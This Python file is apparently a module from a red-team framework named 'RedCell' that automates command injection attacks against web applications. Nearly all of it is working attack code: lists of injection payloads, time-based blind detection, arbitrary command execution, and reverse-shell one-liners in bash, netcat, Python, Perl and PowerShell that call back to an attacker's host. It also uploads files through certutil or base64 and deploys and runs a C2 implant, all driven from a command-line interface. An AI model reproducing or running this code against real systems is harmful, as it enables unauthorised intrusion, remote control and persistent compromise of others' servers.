"""
Command Injection Exploit Module

Automated command injection exploitation for initial access.
"""

import requests
import re
import base64
import time
from typing import Optional, Dict, List, Tuple
from urllib.parse import urljoin
import subprocess


class CmdInjectionExploit:
    """
    Command Injection exploitation framework.

    Features:
    - Vulnerability detection
    - Multiple injection techniques
    - Blind command injection support
    - Interactive shell capability
    - Payload delivery
    - C2 implant deployment
    """

    # Command injection payloads for different shell contexts
    INJECTION_PAYLOADS = [
        # Unix shell metacharacters
        "; {cmd}",
        "| {cmd}",
        "|| {cmd}",
        "& {cmd}",
        "&& {cmd}",
        # Command substitution
        "`{cmd}`",
        "$({cmd})",
        # Input redirection
        "\n{cmd}\n",
        # Pipe with newline
        "|\n{cmd}",
        # Windows-specific
        "| {cmd}",
        "& {cmd}",
    ]

    # Detection payloads - commands that produce unique output
    DETECTION_COMMANDS = {
        'unix': [
            'echo redcell_$(whoami)_redcell',
            'id',
            'uname -a',
        ],
        'windows': [
            'echo redcell_%USERNAME%_redcell',
            'whoami',
            'ver',
        ]
    }

    # Blind detection - time-based
    BLIND_PAYLOADS = {
        'unix': 'sleep 5',
        'windows': 'timeout /t 5'
    }

    def __init__(self, target_url: str, verify_ssl: bool = False):
        """
        Initialize command injection exploit.

        Args:
            target_url: Target application URL
            verify_ssl: Verify SSL certificates
        """
        self.target_url = target_url
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.os_type = None  # Will be detected: 'unix' or 'windows'

    def test_vulnerability(
        self,
        endpoint: str,
        param: str,
        method: str = 'GET',
        detect_blind: bool = True
    ) -> Tuple[bool, Optional[str]]:
        """
        Test if parameter is vulnerable to command injection.

        Args:
            endpoint: Target endpoint path
            param: Parameter name to test
            method: HTTP method (GET or POST)
            detect_blind: Also test for blind injection

        Returns:
            Tuple of (is_vulnerable, injection_technique)
        """
        url = urljoin(self.target_url, endpoint)

        print(f"[*] Testing parameter '{param}' for command injection...")

        # Test both Unix and Windows detection commands
        for os_type, commands in self.DETECTION_COMMANDS.items():
            for cmd in commands:
                for payload_template in self.INJECTION_PAYLOADS:
                    payload = payload_template.format(cmd=cmd)

                    try:
                        if method.upper() == 'GET':
                            response = self.session.get(
                                url,
                                params={param: payload},
                                verify=self.verify_ssl,
                                timeout=10
                            )
                        else:
                            response = self.session.post(
                                url,
                                data={param: payload},
                                verify=self.verify_ssl,
                                timeout=10
                            )

                        # Check for command output in response
                        if 'redcell_' in response.text:
                            print(f"[+] Command injection detected!")
                            print(f"[+] OS Type: {os_type}")
                            print(f"[+] Payload: {payload}")
                            self.os_type = os_type
                            return True, payload_template

                        # Check for common command output patterns
                        patterns = {
                            'unix': [r'uid=\d+', r'Linux', r'Darwin', r'/bin'],
                            'windows': [r'Windows.*Version', r'C:\\', r'\\Users\\']
                        }

                        for pattern in patterns.get(os_type, []):
                            if re.search(pattern, response.text, re.IGNORECASE):
                                print(f"[+] Command injection detected via pattern matching!")
                                print(f"[+] OS Type: {os_type}")
                                print(f"[+] Pattern: {pattern}")
                                self.os_type = os_type
                                return True, payload_template

                    except Exception as e:
                        pass

                    time.sleep(0.1)

        # Test for blind command injection
        if detect_blind:
            print("[*] Testing for blind command injection...")
            if self._test_blind(url, param, method):
                print("[+] Blind command injection detected!")
                return True, "blind"

        return False, None

    def _test_blind(self, url: str, param: str, method: str) -> bool:
        """
        Test for blind command injection using time delays.

        Args:
            url: Target URL
            param: Vulnerable parameter
            method: HTTP method

        Returns:
            True if blind injection detected
        """
        for os_type, sleep_cmd in self.BLIND_PAYLOADS.items():
            for payload_template in self.INJECTION_PAYLOADS:
                payload = payload_template.format(cmd=sleep_cmd)

                try:
                    start_time = time.time()

                    if method.upper() == 'GET':
                        self.session.get(
                            url,
                            params={param: payload},
                            verify=self.verify_ssl,
                            timeout=15
                        )
                    else:
                        self.session.post(
                            url,
                            data={param: payload},
                            verify=self.verify_ssl,
                            timeout=15
                        )

                    elapsed = time.time() - start_time

                    # If response took ~5 seconds, likely vulnerable
                    if 4.5 <= elapsed <= 6.5:
                        print(f"[+] Time-based detection successful ({elapsed:.2f}s delay)")
                        self.os_type = os_type
                        return True

                except requests.exceptions.Timeout:
                    # Timeout might indicate successful injection
                    pass
                except Exception:
                    pass

                time.sleep(0.1)

        return False

    def execute_command(
        self,
        endpoint: str,
        param: str,
        command: str,
        injection_technique: str,
        method: str = 'GET'
    ) -> Optional[str]:
        """
        Execute arbitrary command via injection.

        Args:
            endpoint: Vulnerable endpoint
            param: Vulnerable parameter
            command: Command to execute
            injection_technique: Injection payload template
            method: HTTP method

        Returns:
            Command output or None
        """
        url = urljoin(self.target_url, endpoint)

        # Build payload
        if injection_technique == "blind":
            # For blind injection, use output redirection
            if self.os_type == 'unix':
                payload = f"; {command} > /tmp/out.txt"
            else:
                payload = f"& {command} > C:\\temp\\out.txt"
        else:
            payload = injection_technique.format(cmd=command)

        try:
            if method.upper() == 'GET':
                response = self.session.get(
                    url,
                    params={param: payload},
                    verify=self.verify_ssl,
                    timeout=10
                )
            else:
                response = self.session.post(
                    url,
                    data={param: payload},
                    verify=self.verify_ssl,
                    timeout=10
                )

            # Try to extract command output
            return response.text

        except Exception as e:
            print(f"[-] Error executing command: {e}")
            return None

    def get_reverse_shell(
        self,
        endpoint: str,
        param: str,
        injection_technique: str,
        lhost: str,
        lport: int,
        method: str = 'GET'
    ) -> bool:
        """
        Obtain reverse shell via command injection.

        Args:
            endpoint: Vulnerable endpoint
            param: Vulnerable parameter
            injection_technique: Injection payload template
            lhost: Attacker's listening IP
            lport: Attacker's listening port
            method: HTTP method

        Returns:
            True if shell payload executed
        """
        print(f"[*] Attempting to obtain reverse shell to {lhost}:{lport}")

        # Build reverse shell payload based on OS
        if self.os_type == 'unix':
            shell_payloads = [
                f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                f"nc {lhost} {lport} -e /bin/bash",
                f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            ]
        else:
            shell_payloads = [
                f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            ]

        for shell_cmd in shell_payloads:
            print(f"[*] Trying reverse shell technique...")

            result = self.execute_command(
                endpoint,
                param,
                shell_cmd,
                injection_technique,
                method
            )

            if result is not None:
                print(f"[+] Reverse shell payload executed!")
                print(f"[*] Check your listener at {lhost}:{lport}")
                return True

            time.sleep(0.5)

        print("[-] All reverse shell attempts failed")
        return False

    def upload_file(
        self,
        endpoint: str,
        param: str,
        injection_technique: str,
        file_content: str,
        remote_path: str,
        method: str = 'GET'
    ) -> bool:
        """
        Upload file via command injection.

        Args:
            endpoint: Vulnerable endpoint
            param: Vulnerable parameter
            injection_technique: Injection payload template
            file_content: Content to write
            remote_path: Remote file path
            method: HTTP method

        Returns:
            True if upload successful
        """
        print(f"[*] Uploading file to {remote_path}")

        # Base64 encode content to avoid special characters
        b64_content = base64.b64encode(file_content.encode()).decode()

        # Build upload command based on OS
        if self.os_type == 'unix':
            upload_cmd = f"echo {b64_content} | base64 -d > {remote_path}"
        else:
            # Windows - use certutil for base64 decoding
            temp_file = "C:\\temp\\temp.b64"
            upload_cmd = f"echo {b64_content} > {temp_file} && certutil -decode {temp_file} {remote_path}"

        result = self.execute_command(
            endpoint,
            param,
            upload_cmd,
            injection_technique,
            method
        )

        if result is not None:
            print(f"[+] File uploaded to {remote_path}")
            return True

        return False

    def deploy_implant(
        self,
        endpoint: str,
        param: str,
        injection_technique: str,
        c2_url: str,
        method: str = 'GET'
    ) -> bool:
        """
        Deploy C2 implant via command injection.

        Args:
            endpoint: Vulnerable endpoint
            param: Vulnerable parameter
            injection_technique: Injection payload template
            c2_url: C2 server URL
            method: HTTP method

        Returns:
            True if successful
        """
        print(f"[*] Deploying C2 implant...")

        # Read implant code
        try:
            with open('c2/implant/basic_implant.py', 'r') as f:
                implant_code = f.read()
        except:
            print("[-] Could not read implant code")
            return False

        # Modify implant to connect to our C2
        implant_code = implant_code.replace(
            'http://127.0.0.1:8443',
            c2_url
        )

        # Determine remote path
        if self.os_type == 'unix':
            implant_path = '/tmp/implant.py'
        else:
            implant_path = 'C:\\temp\\implant.py'

        # Upload implant
        if not self.upload_file(endpoint, param, injection_technique,
                               implant_code, implant_path, method):
            return False

        # Execute implant
        if self.os_type == 'unix':
            exec_cmd = f"python3 {implant_path} &"
        else:
            exec_cmd = f"python {implant_path}"

        print(f"[*] Executing implant...")
        self.execute_command(endpoint, param, exec_cmd, injection_technique, method)

        print(f"[+] Implant deployed and executed!")
        print(f"[*] Check C2 server for new implant registration")
        return True

    def interactive_shell(
        self,
        endpoint: str,
        param: str,
        injection_technique: str,
        method: str = 'GET'
    ):
        """
        Pseudo-interactive shell via command injection.

        Args:
            endpoint: Vulnerable endpoint
            param: Vulnerable parameter
            injection_technique: Injection payload template
            method: HTTP method
        """
        print("[*] Starting interactive shell (type 'exit' to quit)")
        print("[*] Note: This is a pseudo-shell via HTTP requests\n")

        while True:
            try:
                cmd = input("$ ").strip()

                if cmd.lower() in ['exit', 'quit']:
                    break

                if not cmd:
                    continue

                output = self.execute_command(
                    endpoint,
                    param,
                    cmd,
                    injection_technique,
                    method
                )

                if output:
                    print(output)
                else:
                    print("[-] No output or command failed")

            except KeyboardInterrupt:
                print("\n[*] Exiting shell...")
                break
            except Exception as e:
                print(f"[-] Error: {e}")


def main():
    """Main function for standalone usage."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell Command Injection Exploit')
    parser.add_argument('target', help='Target URL (e.g., http://target:8080)')
    parser.add_argument('--endpoint', default='/api/process', help='Endpoint to exploit')
    parser.add_argument('--param', default='file', help='Parameter to exploit')
    parser.add_argument('--method', default='GET', help='HTTP method (GET/POST)')
    parser.add_argument('--test', action='store_true', help='Test for vulnerability')
    parser.add_argument('--cmd', help='Execute single command')
    parser.add_argument('--shell', action='store_true', help='Interactive shell')
    parser.add_argument('--reverse', help='Reverse shell (format: IP:PORT)')
    parser.add_argument('--c2', help='Deploy implant with C2 URL')
    parser.add_argument('--upload', help='Upload file (format: local_path:remote_path)')

    args = parser.parse_args()

    exploit = CmdInjectionExploit(args.target)

    # Test for vulnerability
    if args.test:
        print("[*] Testing for command injection vulnerability...")
        is_vuln, technique = exploit.test_vulnerability(
            args.endpoint,
            args.param,
            args.method
        )

        if is_vuln:
            print(f"[+] Target is vulnerable!")
            print(f"[+] Injection technique: {technique}")
        else:
            print("[-] No vulnerability detected")
        return

    # For exploitation, need to find vulnerability first
    print("[*] Detecting vulnerability...")
    is_vuln, technique = exploit.test_vulnerability(
        args.endpoint,
        args.param,
        args.method
    )

    if not is_vuln:
        print("[-] Target does not appear vulnerable")
        return

    print(f"[+] Vulnerability confirmed! Technique: {technique}")

    # Execute single command
    if args.cmd:
        print(f"[*] Executing command: {args.cmd}")
        output = exploit.execute_command(
            args.endpoint,
            args.param,
            args.cmd,
            technique,
            args.method
        )
        if output:
            print("[+] Output:")
            print(output)

    # Interactive shell
    elif args.shell:
        exploit.interactive_shell(args.endpoint, args.param, technique, args.method)

    # Reverse shell
    elif args.reverse:
        lhost, lport = args.reverse.split(':')
        exploit.get_reverse_shell(
            args.endpoint,
            args.param,
            technique,
            lhost,
            int(lport),
            args.method
        )

    # Deploy C2 implant
    elif args.c2:
        exploit.deploy_implant(args.endpoint, args.param, technique, args.c2, args.method)

    # Upload file
    elif args.upload:
        local_path, remote_path = args.upload.split(':')
        with open(local_path, 'r') as f:
            content = f.read()
        exploit.upload_file(
            args.endpoint,
            args.param,
            technique,
            content,
            remote_path,
            args.method
        )

    else:
        print("[-] Please specify an action (--cmd, --shell, --reverse, --c2, or --upload)")


if __name__ == '__main__':
    main()
